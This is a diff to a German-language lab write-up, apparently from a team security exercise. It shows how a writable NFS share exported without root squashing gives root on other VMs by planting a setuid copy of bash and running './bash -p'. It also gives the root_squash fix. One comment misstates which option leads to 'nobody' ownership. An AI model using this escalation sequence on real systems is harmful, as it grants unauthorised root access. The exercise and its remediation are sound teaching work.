@@ -328,8 +328,21 @@ mkdir -p /mnt/nfs
 mount -t nfs 192.168.5.7:/export /mnt/nfs -o nolock
 ls -la /mnt/nfs
 # -> überprüfe welche UUID auf /export/atten zugriff hat
-
+# find /mnt/nfs -writable
+cd /mnt/nfs/atten # in ordner mit schreibrechten
+cp $(which bash) .
+ls -la    # -> testen welcher nutzer bash owned -> bei no_root_squash wird es leider nur nobody sein
+chmod +s bash # -> setuid bit setzen -> bei ausführung rechte des owners -> root
+./bash -p # -> root shell (erkennbar an `#` statt `$`)
 ```
+
+Hier nach als atten auf einer beliebiegen VM des Teams 10 eingeloggt und `./bash -p` ausgeführt werden und man hat root rechte.
+
+**Lösung:**
+Die Lösung ist hier die Option `root_squash` zu aktivieren. Das bedeutet, dass der root-Benutzer auf dem Client als niemand (nobody) auf dem Server behandelt wird, wodurch keine bash datei mit root rechten erstellt werden kann.
+
+**Wirksamkeit:**
+Die Methode ist sehr effektiv um die Problemantik falsch konfigurierter NFS Shares zu demonstrieren und zu zeigen wie einfach es ist dadurch auf allen VMs root rechte zu erlangen.
 
 ### 2. lokale Exploits
 
